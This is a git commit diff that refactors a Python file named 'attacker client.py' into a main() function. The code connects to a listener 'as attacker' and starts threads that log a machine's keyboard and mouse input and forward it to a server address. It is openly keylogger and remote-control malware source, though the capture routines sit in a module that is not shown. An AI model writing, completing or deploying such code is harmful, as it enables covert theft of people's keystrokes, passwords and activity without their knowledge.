c4d668e0443f4ae10580dda4beb97368c0357ceb
mrvs0 <mrvs025@gmail.com>
2023-01-02 18:15:02 +0200

    branch initialization creating main

--- attacker client.py
+++ attacker client.py
@@ -1,9 +1,15 @@
 import functions
 from threading import Thread
 
-server_ip = ('127.0.0.1', 42069)
-ip_for_conection = ('127.0.0.1', 420)
 
-functions.connect_as_attacker(ip_for_connection_as_attacker=ip_for_conection)
-Thread(target=functions.log_keyboard, args=(server_ip,)).start()
-Thread(target=functions.log_mouse, args=(server_ip,)).start()
+def main():
+    server_ip = ('127.0.0.1', 42069)
+    ip_for_conection = ('127.0.0.1', 420)
+
+    functions.connect_as_attacker(ip_for_connection_as_attacker=ip_for_conection, ip_of_server=server_ip)
+    Thread(target=functions.log_keyboard, args=(server_ip,)).start()
+    Thread(target=functions.log_mouse, args=(server_ip,)).start()
+
+
+if __name__ == '__main__':
+    main()
